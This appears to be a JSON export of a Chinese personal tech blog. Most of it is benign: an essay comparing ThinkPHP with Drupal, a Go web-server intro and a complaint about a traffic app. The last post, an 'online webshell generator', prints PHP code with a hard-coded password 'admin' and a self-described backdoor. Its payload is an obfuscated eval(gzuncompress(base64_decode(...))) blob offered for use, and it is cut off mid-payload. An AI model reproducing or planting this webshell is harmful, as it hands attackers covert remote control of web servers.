\n\n多语言处理：\n\n在实现上ThinkPHP和Drupal都是基于英语作为开发元语言，ThinkPHP的翻译实现非常简陋，在现实中通常不能满足需求，开发国际化应用时尤其如此（这应是应用范围覆盖不足导致的），Drupal具备完整的多语言系统，已经完整处理以下概念：\n\n语言单复数问题（部分语言还不止单复数）\n上下文问题（“may”翻译成“可以”还是“五月”呢？）\nJS里面文字的翻译\n界面、配置和内容语言的翻译\n团队翻译协作机制\n向左文字语种的处理等等\n而这些ThinkPHP都不具备，仅简单的实现了模板里面文字的翻译，语句中变量的替换；此外Drupal天然具备多种语言协商机制，如用户设置、URL前缀、会话信息、域名、HTTP头、用户代理标识等等，支持通过插件自定义语言协商机制，在ThinkPHP中默认仅支持URL、HTTP头变量、cookie、浏览器，注意如果你以Cookie来传递语言信息，在开发国际系统时可能会遇到法律问题，很多国家要求系统明确提问用户是否能够使用其Cookie；综上使用ThinkPHP时需要开发者自行解决大多数语言问题，但实际上多语言系统贯穿整个系统，非常庞大复杂，Drupal由于是国际共建的系统，多语言是其一大亮点，是天然的多语言系统，只此一项就可能难住ThinkPHP开发者。\n\n \n\n缓存系统：\n\n完整的缓存系统有三要素：超期时间、失效标签、上下文，Drupal对其有完整实现，而ThinkPHP只实现了时间和标签，没有实现上下文，何为上下文呢？简单的说它指示同一个缓存键KEY下，被缓存物属于谁在何种环境条件下进行的缓存，比如用户的权限、登录状态、语言、ip、协议版本、主题信息等都属于缓存上下文，同一个KEY在不同上下文条件下需要读取不同的缓存物，这对大型系统设计至关重要，且该系统非常庞大，ThinkPHP需要开发者自行解决缓存上下文的问题，此外ThinkPHP未提供缓存合并机制，这将无法实现缓存的分层分级处理，要实现高效缓存，该功能是必不可少的。\n\n \n\n会话Session：\n\n使用ThinkPHP的开发者得自己解决会话相关问题了，为什么呢？IT发展到今天，仅小微系统只使用一台服务器，大多数系统都会负载均衡到多台服务器上，因此应用必须要求无状态，那么会话数据就不能存储在本机，通常的解决办法是存储到数据库中，基于此，由于ThinkPHP是一个框架无法提供数据库储存会话的现存方案，因此需要开发者自行处理，而Drupal本身已经考虑到负载均衡、应用无状态等事情，会话默认已经储存到数据库，可以开箱即用，尽管ThinkPHP提供了扩展能力，开发者还是要付出许多人力成本去实现开发\n\n在ThinkPHP的会话实现中有个问题：会话的保存不在脚本结束之后进行，而是在脚本里面执行，这样当用户调用die或exit就会导致无法保存，应当注册关机函数才对，详见php函数：\n\nregister_shutdown_function\n\n \n\n数据库：\n\nThinkPHP和Drupal都支持多数据库，该特性在ThinkPHP中自创了一个“分布式数据库”的概念来描述，Drupal没有专门渲染概念，只用业务标识对不同数据库进行区分，二者也都支持主从配置和读写分离；但在实现上很明显Drupal优雅很多，比如在数据库配置的数据结构上，Drupal采用一个多维数组，第一级键名是业务标识，第二级键名是主从标识，其值就是连接配置信息，这样的结构十分简单，如果你要实现一个数据库负载调度子系统，那么该结构的接口是非常简单的，而ThinkPHP的配置数据结构中，把所有的主机地址储存在一个数组键下，把所有的密码储存在另外一个数组键下，等等诸如此类的还有用户名等，这样的结构在生成连接信息时还需要再次解析配置信息，不但阅读修改不直观还消耗了系统性能，数据库负载调度子系统的接口也较复杂，非常不优雅。\n\n二者也都支持多类型数据库，Drupal核心自带对mysql、pgsql、sqlite三种数据库的支持，加上社区模块几乎完整实现了对所有常用数据库的支持，在底层，Drupal将不同数据库的差异称为“方言”，不同方言的处理在驱动层完成，向上层提供统一接口，换句话说上层数据库操作类感知不到底层用的是什么数据库，采用标准的SQL规范，这样就完美屏蔽差异，实现了数据库解耦，模块开发者就不用去考虑用户用的是什么数据库，建表、查询、修改等等全部是统一的，在应用层切换不同种类数据库时可以做到一键搞定。\n\n关于数据库操作，Drupal由于是一个完整系统，已经默认实现了一整套非常先进的数据储存结构，该结构提供了对系统数据层的支持，当所有人都基于统一数据结构时，奇妙的事情就产生了，分布在全球的人们可以合作实现丰富的上层应用，该结构造就了大名鼎鼎的实体概念，由此Drupal也提供了更多关于数据的操作，比如实体查询，用户实现了开箱即用， Drupal是包容的，用户也可以定义自己的数据结构。\n\n对数据层的支持ThinkPHP是无法做到的，ThinkPHP用模型来处理数据封装和操作，模型和实体相比，是非常初期和幼小的概念，它能做的实体皆可做，反过来则不行，比如模型不支持输入用的字段控件、输出用的格式化器、表单和查看的显示控制等等，究其原因，是因为这些都需要更高层面的实现。\n\n中外开源生态与联系：\n\n在充分对比后，会明白ThinkPHP能做的Drupal都能做，而且做的更好，反过来却不行，因为Drupal是一个完整后端系统，被人誉称为WEB操作系统，已帮助做了更多的事情，常用需求基本都有了，开箱即用，ThinkPHP开发者想要那些功能，则需要在ThinkPHP基础上走非常远的路，先不提质量问题，单就时间消耗就是一个惊人的数字（比如Drupal 8正式版发布之前，其各种开发版，就由一千多名国际顶级开发者为此工作了五年），事实上很多Drupal开发者确实也不屑于去学习ThinkPHP或者是其他框架，但在国内可以发现一个很奇特的现象：为什么国内还有很多小公司在用ThinkPHP？（关于这一点，可以到各招聘平台搜索PHP招聘信息就可略知一二），要解释这一点有两方面原因：\n\n文化交流受阻：\n\n中外文化、生活等的交流依然还只限于一小部分人，大部分人是没有异国朋友的，主要原因是众所周知的网络屏障和语言问题，语言不通应该是主要原因，我国发展太快，目前国内开发者主力是70后到90后这一批人，绝大部分英语沟通水平欠佳，哑巴英语，或者阅读困难，他们往往本能的不会去接触英文资料，00后或者10后的英语水平则高很多（得益于教授早，互联网等），在未来他们会更多融入国际环境，所幸的是现在科技发达，翻译软件水准越来越高，也越来越多人投身到技术引进上面来，比如Drupal在中国就有“Drupal中国”、“爱码文档汇”、“水滴间”、“Drupal大学”、“Think in Drupal”、“宁皓网”等等一大批技术平台，这些平台或博客提供了巨量、几乎完整的中文文档，扫平了语言障碍。在北上广深、成都、南宁、宁波等等城市均有以Drupal作为核心技术的开发公司。\n\n \n\n压力下导致的快餐现象：\n\n中国人绝对是世界上最勤劳的人群之一，这种勤劳很大程度上和压力相关，住房、结婚、医疗、教育、养老每一个都是一座大山，“搞钱”必须是头等重要的大事，对于大多数普通民众来说，保持匠心做长线积累风险太大，缺乏安全感，眼下能搞的钱先搞了再说，社会发展那么快谁能知道以后什么样子，这种现象对我国基础科学领域伤害巨大，同样的在快速发展的IT业更是如此，我国开发者身上的担子太重了，996甚至被大公司推崇，长期做着CURD这样简单的码农的工作，很多开发者根本没有太多时间去学习，稍有时间得用来陪陪家人、孩子、女朋友，自己休息的时间很少，学习深究就更难了，如果有多余时间通常用来接私活搞外快，在这样的大环境下，大家习惯于“吃快餐”，有锄头用就先用着，学习挖掘机没有空，发展挖掘机更是成本高昂，最终导致了我国开源事业难以发展，为数不多的开源项目带着浓浓的商业味，其中小公司靠广告补贴，靠开源项目引流商业项目盈利（看看ThinkPHP的首页就能感受到），大公司则出于培养后备人才、免费消除Bug等等而选择开源，带着浓厚的“势力范围”色彩，总的来说纯粹的热爱和兴趣占比很小，但这不应责备中国的开发者们，这是重压力的大环境所致，现在也出现了逃离一线城市的现象，许多人去到不那么繁忙，有些闲暇时间的二线城市，也许他们是开源的一种力量，得到APP（罗辑思维）也预测中国的创新中心可能会移动到那些拥有闲暇的二线城市。\n\n相反国际开源的土壤好的多，由许多发达国家主导，而这些国家通常是福利型国家，相比压力不大，人们靠兴趣做事的空间很大，许多参与开源的人首要考虑的是人生意义，关于此有个“马斯洛需求模型”读者可以了解下，“喜欢”保证了“质量”，福利可以让开发者不考虑年龄、工作，在一年一度的DrupalCon大会上，你可以看到很多开发者年龄都非常大，五六十岁的人很多，他们在一起眼中带光的谈论技术，将一生的积累注入到Drupal中。\n\n当然国际开源也并非主要由发达国家参与，英语系的不发达国家也是重点参与者，他们往往是通过开源衍生的商业项目赚取外汇，典型国家就是印度，在印度两极分化严重，曾经被英国殖民过，在其高端人群中英语普及率很高，这一点让印度高度融入国际开源，相应的造就了印度较高的软件开发实力。\n\n \n\n开发者职业规划：\n\n这一节讨论下国内开发者的职业规划问题，在国内社会一直有一种声音：“程序员是吃青春饭的”，对应的通常就是35岁门槛，你可能经常看到某某大公司辞退35岁的大龄开发者，一些公司招聘年龄要求不能超过35岁，很奇怪，35岁正是能力上积累较深，很多事情的分寸上拿捏得当的年纪，为什么会出现这个现象呢？我们来探索下：\n\n首先那些新闻有很重的博眼球嫌疑，就像“女司机”一样，实际上女司机的事故率比男司机还少，正是因为少所以才是新闻，才能让你浏览，但这样的新闻多了你会形成错觉，因此35岁门槛一定程度上被过度渲染了，造成了不好的影响，甚至有些人无理由跟风。\n\n但35岁门槛又有一些道理，这要选择性区分，如果开发者一直做着CURD这样简单、重复性的体力活（真正的码农），那么当达到35岁时，和刚出校门一两年的年轻人比，竞争力可想而知，35岁时孩子上学、父母身体、住房等压力会很大，逼迫开发者提出更高的待遇要求，家庭事务、应酬交际等也多，不愿加班，通常工龄长累加的工资相对更高，如果你做的事情年轻人也能做，老板选谁呢？同时年纪大了多少有些面子问题，如果上司是个比自己小很多的年轻人，是否服管呢？对于年轻人来说管理一个比自己年长很多的人有时也挺尴尬。根据这些可见35岁门槛的存在有一定的道理。\n\n时间不等任何人，那么开发者如何避免35岁门槛，该如何规划自己的一生呢？\n\n如果你发现自己并不真的喜欢技术，那么你应该在年纪上还有竞争力时趁早转型，跟随内心，找到喜欢的事情并开始积累竞争力。\n\n如果你真的很喜欢技术，并愿意且准备好以此度过一生，那么你就需要高效积累，不停学习，时刻注意拉开和年轻人的技术差距，他们有压力小和体力强的优势，你需要以技术优势进行弥补，大神之路不是你可选可不选，而是必须选择的，当到达35岁时，你必须是一个大神，担起年轻人难以胜任的系统岗位。\n\n这里需要提醒你随着社会的发展，技术的门槛其实是在逐步提高的，比如你可能听说过“全栈工程师”，但那只属于互联网时代初期，现在社会分工太细太深，已经不存在全栈了，如果存在那可以换个叫法“样样懂，门门差”，因为人的精力差距不会太大，你选择研究全部，别人选择钻研一处，而用人单位是按岗位用人的，你需要考虑谁更有优势，理智会让你选择深钻一门，周边懂得即可，但这样你会成为一个大机器上的一个部件，你的选择自由被限制，细分门槛要求会很精专，浅尝辄止，不求精深必面临淘汰。\n\n做这样的机器部件不适合有创业理想的人，那么创业会面临些什么呢？看看中国社会的发展，所有通用的IT需求你可能都没有机会，比如网站被公众号取代，不多的网站市场也被SaaS平台占领，与这样的平台竞争，他们只需要点鼠标初始化即可，你得写代码，他们按时间收费可以很低，你得一次性收费，站在客户角度首要考虑的当然是成本问题，通用需求还包括电商系统、直播系统、内容付费系统等等，而这些都有很成熟的现存解决方案，在规模优势上，微盟、有赞、微擎、微积木等等这些都是已经发展起来的很不错的SaaS平台，非通用的IT需求呢？会形成许多垂直领域的解决方案，山头被抢占瓜分，比如美团、滴滴、土巴兔、顶呱呱等等，他们所在的领域你都很难再有机会，留给开发者的仅剩下数量不多的真正需要定制化的需求，这样的需求有个特点，由于是定制，成本原因决定了客单价必须高，此时客户会对创业者公司的实力有所要求，你有多少员工？有多大的办公室？有多长时间的历史积累？有多少案例？注册资本有多高？\n\n此外IT发展到今天，同一个应用系统在软件形式上会呈现多种形式，通常需要App、小程序、网页等中的一种或几种，还涉及到跨平台（APP有安卓、IOS和即将出现的鸿蒙，小程序涉及微信、支付宝、百度、抖音等等），虽然有UNIAPP这样的工具，但在客户要求原生应用时仍然所需技能很多，这就导致必须组建团队，团队成员还包括非技术人员等，比如业务员、财务等，这些都形成了一定的进入门槛，最终你会发现创业需要的不止是技术更多的是资金。\n\n说到这里你是否感觉路很难？但请你相信不是只有IT领域是这样的，有竞争的地方都会这样，任何成功皆不容易，唯有你的兴趣能保证你能走多远、走多高，所以请跟随自己的内心。\n\n如果你跟随内心，深思后依然选择了做技术，当一个了不起的大神，那么你该怎么做呢？首先你必须要注重积累，尤其是要站在巨人的肩膀上向着未开发的土地猛冲，你需要找到所在细分领域最有前景的生态圈，加入进去，回到PHP开发框架上来，小白看框架它只是进一步封装提供了要的功能，而大神看框架是它提供了一个统一的协作平台，大家都在同一个平台上进行创造，这样才能避免自己重复造轮子，在经济成本上才足够划算，借助众人的力量才能腾出手来发展自己的事情。\n\n基础平台的统一性非常重要，只有这样人类才能累积向前，才能降低成本，但统一平台的形成有个很有意思的规律，那就是最终只会剩一个作为主要平台，然后有个处于第二位的平台来形成竞争后备，第三第四位的基本可以忽略不计了，且第一位和第二位在体量上会选差很远，这样的列子有很多，比如历史上有几千个操作系统，最终剩下window和linux，二者用户数量选差很远，又比如安卓和苹果、淘宝和京东、抖音和快手、美团和饿了么等等皆是如此，一旦格局形成，便很难撼动，比如微软就撼不动安卓，不是因为技术，而是因为滚雪球效应在发挥作用，王者会更强、更大，败者逐渐落寞消失，即便王者犯了些小错发展也不可改变，比如现在我们使用的键盘，其字母排列其实不是最合理的，历史上也出现过排布合理的键盘，但由于大家已经习惯于现在的键盘，所以也就延续使用了，要成为王者有两点很重要：技术层面的先进性要足够、社区生态要建立滚雪球效应，这两点相辅相成。\n\n那么在PHP框架领域谁会成为这个统一的基础平台呢？开源项目的主要发展力量应该是大批使用者在使用过程中不断的提炼并总结，然后一起对其的持续讨论并改进，而不是几个人单凭自己的思考或经验，因此如果在ThinkPHP和Symfony中做选择，答案已经非常清楚，其实很早Symfony就意识到统一平台的意义所在，因此致力于解耦的、完备的基础组件的建立，并反复迭代，以至于现存其他一些框架也用Symfony的组件，比如Laravel和ThinkPHP，Symfony一再强调“标准”，且现在也已经存为php开发领域的事实标准，因为标准化就是统一平台的必备条件。\n\n至于Drupal则是在Symfony基础上建立起来的更高一层的统一标准平台，成为了完整系统的标准基础，在这里常用的应用层功能几乎都已被提供，人们正在此统一平台上，基于模块化设计，创建更多面向未来的功能，实现Drupal的理想“提供卓越的数字体验”。\n\n \n\n决策者技术选型：\n\n如果你是一位创业老板，或项目总监，正为项目进行技术选型，那么这里为你提供几个注意事项：\n\n控制成本：\n\n这似乎不用多说，理所当然，但你真的控制到了吗？软件是无形的，如果你不是专业人士，很难控制成本，这里说一些坑：\n\n在目前环境下，想做个长远规划的项目，能自己开发，就不要外包，有些东西看起来一样实则差距非常大，不专业的人很难看出健壮性、扩展性、安全性、持续性等等性质在两个系统间有何不同，比如同样功能的系统，负载五千和负载五千万的开发成本是完全不同的，又比如软件文档工作量有时会远高于软件开发本身，文档是保障系统长远发展的重点，但外包很难做到文档齐全，外包质量通常会让你在日后买单，究其原因，不是因为外包公司实力不行，而是成本问题。\n\n \n\n少欠技术债：\n\n不要在开始因为省钱，找一些积累不够的开发者，这里分享个故事：有位老板和技术总监在人才招聘上出现了分歧，技术总监要求给出岗位工资1.5万，来了一个应聘者只要八千，技术总监不要，但老板大喜，认为赚到了，为什么要傻傻的多给钱呢？有时小白会在系统中留下巨大隐患，这位技术总监就是看到了技术债问题，开发团队一定要有积累深的技术骨干来把控系统，同时在选择基础系统时不要选择成熟度低的东西，这样保证尽可能不欠技术债，否则你会开始轻车熟路，后面深陷泥潭，如果遇到商业关键窗口期，那么神仙也救不了你\n\n \n\n借力加速：\n\n社会发展到今天，其实很多IT系统功能都已经有了，而且非常齐全，你不需要自己去开发，比如要在ThinkPHP和Drupal之间选择，我会毫不犹豫的选择Drupal，因为ThinkPHP只是个半成品，通常在各种业务系统中有些功能是必须的，比如垃圾回收系统、状态系统、键值储存、批处理系统、计划任务系统、数据类型化系统、Ajax系统、数据查看引擎、版本支持系统、权限系统等等，这些在ThinkPHP都没有，而Drupal很完备，而要在ThinkPHP上开发出这些，需要数月到数年，不但谈不上基础统一平台的优势，也很难保证自己开发的代码质量，不但白白浪费了资源，在后期新加成员还需要付出高昂的培训费用，有现成的基础齐全的、成熟的系统为什么不用呢？\n\n \n\n融入大环境：\n\n开发体系要融入大环境，除了借力加速外，还在于后备人才的获取，让开发者和项目解耦，不要因为在现有开发者离职或不够时，找不到足够的开发者快速加入项目，融入大环境，解耦开发者很大程度保障了项目的发展安全。\n\n \n\n国家开源建议：\n\n这一节我们站在国家层面，来看看应当如何对待开源，我国日渐强大，很多国人都期待着超越美国那一天早日到来，那么中国要突破美国封锁，达到超越的目的，就必须要参与国际开源成为贡献主力，而不是自己搞一套独立的体系（自建体系应发生在新生事物上，比如下一代物联网操作系统鸿蒙），因为开源是全人类的开源，而不是哪一个国家的开源，闭门造车出门不合辙，会让中国远离世界，要知道中国只有十四亿人，而全世界有七十多亿人，生态力量无法和全世界对抗，因此理性的做法是参与开源，努力做出奉献，一则继承已有的人类发展成果，站在巨人基础上发展更快，二则选择和大多数人在一起，开放国门，建立影响力，才有可能树立大国形象。\n\n \n\n关于本文作者：\n\n云客（个人网站www.inDrupal.com），从事互联网技术多年，最初活动于Discuz、PHPCMS、帝国CMS等国内社区，为这些国内开源系统提供技术贡献，扩展开发，比如为帝国CMS开发有EXCEL导入插件等，后转向开发框架领域，对比ThinkPHP和CI框架（CodeIgniter）后，选择CI深度研习，精读了其所有源代码，并开发了基于CI和帝国的微信公众号管理系统，后意识到框架系统的不足，和对软件架构认识加深，逐步投入国际开源社区，深入研究Drupal，成为Drupal核心贡献者、模块开发者，并耗时六年写作了《云客Drupal源码分析》系列教程，开放阅读，全面系统性向国内开发者介绍Drupal系统，超过一百万字。目前致力于将国际开源技术引入国内，同中国开发者们一起推动中国开源发展。\n\n \n\n本文写作于：2021年5月11-15日\n\n[转载出处](http://drupalchina.cn/node/8507)\n","tags":["ThinkPHP","Drupal"],"categories":["代码笔记"]},{"title":"尝试对 Docker 使用 SQL Server","url":"/2021/10/13/20211013-2/","content":"\n尝试对 Docker 使用 SQL Server 容器映像后，你可能想知道如何 Docker 是如何用于改进开发和测试的。 下面的视频介绍如何在持续集成和部署方案中使用 Docker。\n<!-- more -->\n\n<video src='https://sec.ch9.ms/ch9/2c97/8e3dd09f-f597-46b7-bb7e-0acddf142c97/CONN17T152_mid.mp4' controls></video>","tags":["Docker"],"categories":["代码笔记"]},{"title":"React 函数式父组件调用子组件的方法","url":"/2021/09/27/20210927-1/","content":"\n\n\n<!-- more -->","tags":["React"],"categories":["代码笔记"]},{"title":"初识 Go 语言","url":"/2021/09/23/20210923-1/","content":"![在这里插入图片描述](https://img-blog.csdnimg.cn/dbb82af19d6f47c98c1c983d4b029511.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n<!-- more -->\ngolang与C/C++的简单比较\n\n优点：\n\n- 良好的跨平台，可交叉编译\n- 简单的工程管理，通过文件夹系统管理，没有类似Makefile的工程管理文件\n- 静态编译，没有动态库的依赖，部署方便，编出来只有一个可执行程序\n- 语法简单易学\n- 天生支持并发，goroutine和channel，适合服务器编程\n\n\n## 只需要几行代码即可实现一个服务器\n\n```go\npackage main\n\nimport (\n\t\"net/http\"\n)\n\nfunc main() {\n\thttp.Handle(\"/\", http.FileServer(http.Dir(\".\")))\n\thttp.ListenAndServe(\":8080\", nil)\n}\n\n```\n\n\n在Mac上编译可运行在Linux, Windows上的GO程序demo\n\n## 编译运行在 amd64位 windows系统\n```go\nCGO_ENABLED=0 GOOS=windows  go build \n\n```\n\n## 编译运行在 amd64位 linux系统\n```go\nCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build\n\n\n```\n\n## windows 程序效果演示\n双击`exe`程序,即可打开终端\n![在这里插入图片描述](https://img-blog.csdnimg.cn/d23272b6e0b441fb922c62bd9793dfd0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n## 此时服务已启动，默认端口是8080\n![在这里插入图片描述](https://img-blog.csdnimg.cn/7138d36aecbd4682b365262f685cb80e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n## 打开 localhost:8080 查看效果\n![在这里插入图片描述](https://img-blog.csdnimg.cn/0f87a847afb54858a3ac99089d96e29a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n","tags":["Go"],"categories":["代码笔记"]},{"title":"交管12123真乃中国最垃圾App","url":"/2021/09/15/20210915-1/","content":"\n![在这里插入图片描述](https://img-blog.csdnimg.cn/d8ecd379138d44b08639af398e2fb7dd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n<!-- more -->\n\n最近处理一个违章，无奈不得已需要打开交管12123App,喜闻乐见的看到了意料之中的服务器异常的提示，我轻轻的嘴角上扬了一下。慢慢的退出当前页面，重新进入。经过了5次的反复尝试，终于可以进入违章处理页面了 ，整个过程实属不易。开始处理违章并缴纳罚款，跳转支付宝。完成付款！自以为一气呵成，终于可以不用在忍受这个折磨人的App了。查看一下违章已经清除了。吁呼～\n\n\n时隔一个月后，我又打开12123App，上次交完罚款的违章又死而复生了？What's problem? 哪尼？一大串问号在我头顶飘过。。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/5391ecbfd8f04e0ba7dc5abe174d9351.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n\n于是我开始拨打12123 客户电话，打了2个小时的电话。上海推给合肥，合肥推给蚌埠，蚌埠又推给合肥，合肥又推给上海，上海的电话还一直打不通。高德地图上搜索到的电话，打过去询问，对方态度极其差。一大早上的心情就被这件事搞得很糟糕。最终问题也没解决！真的搞不懂12123 为人民服务的宗旨体现在哪里？\n![在这里插入图片描述](https://img-blog.csdnimg.cn/d9cdf3be0b8b47ebbe447304d3fb6711.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n\n网上搜索一下，负面评价一大堆。\n![在这里插入图片描述](https://img-blog.csdnimg.cn/bf68b6ce400443acb050d77eac08b76f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bCP5p6rdmlw,size_20,color_FFFFFF,t_70,g_se,x_16)\n\n\n\n\n\nzf机构的网站App一直以来都人群众饱受诟病。办事效率低下，服务态度恶劣。成为了他们的标签！\n\n> 马云之前说的好，银行不改变，我们就改变银行！\n\n国有企业如果无法满足市场的需要，那也可以被市场抛弃！","tags":["12123"],"categories":["生活笔记"]},{"title":"webShell 在线生成","url":"/2021/09/13/20210912-1/","content":"\nwebShell 在线生成,此网站需要梯子\n<!-- more -->\n\n```php\n\n<?php\n$password='admin';\n$shellname='我自己去了后门';\n$myurl='http://www.zjjv.com';\nerror_reporting(E_ERROR | E_PARSE);@set_time_limit(0);\nheader(\"content-Type: text/html; charset=gb2312\");\n$filename='$password=\\''.$password.'\\';\n$shellname=\\''.$shellname.'\\';$myurl=\\''.$myurl.'\\';\ne'.'v'.'a'.'l(g'.'z'.'u'.'n'.'c'.'o'.'m'.'p'.'r'.'e'.'s'.'s(b'.'as'.'e'.'6'.'4_'.'d'.'e'.'c'.'o'.'d'.'e'.'(\\'\neJzs/Xt3HNd5Jor/zazl71Buw2rAxKXu1UUQsOpKgheABEBSpK\niD02g0gCYbaKi7QYCi+GEczZxoHM+KJetiWzdbkmNZsi1FkmXH\nyzOT8WQyk/HPcybJTJKZJLN+z7N3VXVVX0BQtpPJOoZEoLtq3/\nd73+/77tb6WqdbbXfHJ2Y/8zsb9c3Gbn28vHO3urHRrnc65cmx\ntZVo+Wq0/Hh5JVheuLS6Fi9ciBa9i1H5iXyN+u6d5l5VVOCfg1\nZ7I/+6s11vNnerO3W8zz4Xe9xvN/FS/OWLxub4o1v17tpOdatR\nW3tyv9Wtd9a29mrjExP3PvM7JzZb7Xq1tj0+tnZpaWVVqXaUsd\nvK3LwydmdCkc8eH7v9hDKndLrtxl6nWUWvnXG8nS1UPhMN1MWj\n0VXvi4E1Op16F7WXo8tXIvSUTv4JMbbtnWZrq7E7rrPCo/U71e\nbQonhZP2x0Z2WTY2vB0tL5hejx3ko+oXx2TtnZsMbTJ3LmorCY\nYK6oeDP8lTI3p2QtiGInMPpaq3W7Udg39jSkYbFgJ06kk5Jf79\nebnbpsq17bbinl00G0uBotz3/01iu/98pfvvWzN3/xwi9/+Fen\nZ5LHZVkLv/iv0ZFt9SAht+8nxKKIlS6sNbelvNE62OWYlI3WGj\n/3PZ8drLFXrd0uy305MbbRaGNbUbez3TroK8Gux55q7KHAbv1A\nqVd379Tb46wiX7X2u3jFElPz+MxnySCarerGON/ncOXs6uqltb\nNYy/IT06Vp4Nf01lOlQQASA9jfRaPpGGudDkA+XWiBmWuiQF/p\nyeFfuy0MOJlNfiFTNGu3Wt01FpkEcK+163vNag2Pb94sT5Znyp\nN4w+0Yz/B/YmIaz/OI2t7fXTto7KKB/XW0MX7p7KW1pZVJRZ1U\njAnCWunawmKpiNprYqNln3vV7vZ4OozpAeqSUBbWH5N7gFUvLJ\nd8ijLKF5W+R8oppVRizY1WY3crV1FCtXiaViw8yipydP0d8lmh\nO/kAddJpsCbXbaBHQfEKHconWX+Nna3+7vCo0Jv43hvgwOiKQ8\nsXZVlgVX231tqoj6d7O7Y3kSAKe59QCHH4IL8lL9KVx27ube81\ndjdbJeAc6EXybXxisGQZSA0kKAswHkphdvebEsXZUvn0Tr1bVb\na73b2p+pP7jTtzpXZ9EzC3XVJqrd1ufbc7V1JnryxfmPtiab48\nkULyWA0EuYOZVdvt6t3xz/xO6YPvvP+7z//xj/+mRBoun5b29z\nYbzXpHPCp97/0Xfv+Hb7/6v0uT2WzE81f+53OvszKe8+Hapnz8\n/os/+FryGMW5dvL5Jy988AGg/bXvPPd6aWISHX//37/z7Df+xe\nv/Lt9x58mmAPZelZXLF/gHre3cxdu1+mG9Jt9evI53YuR8Vz/c\nyz1m23jcqbfv7MvHK/g4dSV5XtvZ6PXw1t9/+7/iWbOxu38on7\n78wot/kJRMKVS9LV9xId5/8+OfcHatdlc+fOm9N376vWff+s9y\nXt/5X99+o39Bt/arO1VZmK+/8eGbv/zuf3zzl2il29jer+72Xn\n3/z1555e2fvvNvOPpadZf70Hv53h+99zfJVvAl1rf37vk//9GH\nb7+ONsUguMzP/0eUzA+CUJVuxyt/8c6XfvC3H37t4xfe/EVp4j\nO/I0jGTmcrA42SKgs+98wLf/a1733j/0GfWu/Ju7/31Z/hid4D\nkaSM0XuSlDHlkw/+7dffTspYvSdJGTup9frX/iEp4/SeiDIcX4\nG6dw4aXQohEoUk9a926kqpWd/slk4lzIBfEq673d1pru2Ol05v\nNOdPb3TnTwN9gDNzN0ufu1lSWru1ZqN2G9/I3c42gPLlRre+09\nGAPHgPVoL1w+u1Tr25ebM0X8q1SgKAnexiryZm036U515/8Scf\nPf+d75+eqc6fnmGPGxtKYwNtyIbRaqd7t1nHg41GB7zk7qn1Zq\nt2G93Nn95vyh4U/IwtLy2troULy9icGACxdpEUKX2bzavZ4JzE\nMObKWZ2ynGX5i3Kh5riAj5AGz+WKJLMr82V5/gd/+6PXv/4/33\n7jzVfl0NGwnG1fV4MN97f03Otf+/4HfzmkJciQCmjmnG3PjjVO\nz7kq/pw8OXFvbKPduFOfU2rbkB4aYJ+nysk0G5sKGD/5xbgsNF\n2aKYHrj91pNefEqqyAn5bwTZHv0RFIbH1nr3t3nIUmJkRR+fLo\ntRNFjli45H3/XF/8yQvf+c73k+FN5Gd8/35+9WawuQCIDf5Ktv\nnEWAObqxfEa0mqKV9L7ggRW6CmFEM/JTiPNT41PIthjADmscax\noPlEb3ZiKmJ2YLJSf6g29+uJjD0M0m6W0q1gld4ckvWX9fvgTE\njMR6/8CULebCJc/2ZW9YhF/cM/fe/vyS1+tXUdDctfff6d3//B\ne1/7635oTsSN3oi5iGgyLT8K84etYO/lRuNO8mwd23ybHzK6zA\n4yunyrMw52IiFf6hWPCswmfsmny5F3IU/ziN1osykkYFlOFASO\nfzZB8kRIrNa6VcjLVAkS9QrDUgQ2zZXkS4hE06JVr9YTN4XMI5\nSBYjvZg4aUkyezsYE+yTmXqYeeGFu8cnEtpJ7DDzE+qOkIc5K6\n+JtK6soYBE9IaShbLs8qVAzzjyjfnZqZKU+PqE/1Qq7WKA7R25\nxudb1ZVw4aG6BgN0uaqn4eoLXeakO2mVOV9a1aq9lqE9At8UPw\n6rbxD1sNpN1RIHButzbmyhhdef7Fn3zy8qnTjd096HXdu3sAtO\n3GxkYdDIBEYi7VKRSBkymG9kFLvna3fghg7DSewueKmrYiVIW0\nDbHn5XmlUA9q1E6jm5X58ZdffK0M0OSA+7tbb/dNhJtahnJfE0\n0BA/ab3cYeVEZRfWqj2q1ihQAFjdZuD3HqG41u+5G9udJ0TzmQ\n4DhdOmqKN0vr+91uCziWDPZm6YM3X3uW4lyBsrT3O/ttwO3t8T\nI0acLkNOQ8KJjHGcAjwHHUmNMekQtIolRcsRHDIIs+YhhC5z3u\nCFC4OIA8EeRIxktCrJ1M9IwuPuH/R3bXO3uzo34rg43IvRfNUE\nTnJ4qdpRFkIVnN1FRwImdIkAXWG9I6MoYPROL84xQ15avSwXop\nobpCPkuanlsHobPNtY26XJKBjmeTfqHJd4FtBzSRJIVq29U2Bo\nNCc3Pl/e7mVAWq4Fj3sDuiUbxhg9KUJMoV3pAepcOj5JQzN4B6\nrCwsLU6qk9rE/Jw1cQ8DGhwGRnHG1w1NL08oQlYbWuB8GYvZG0\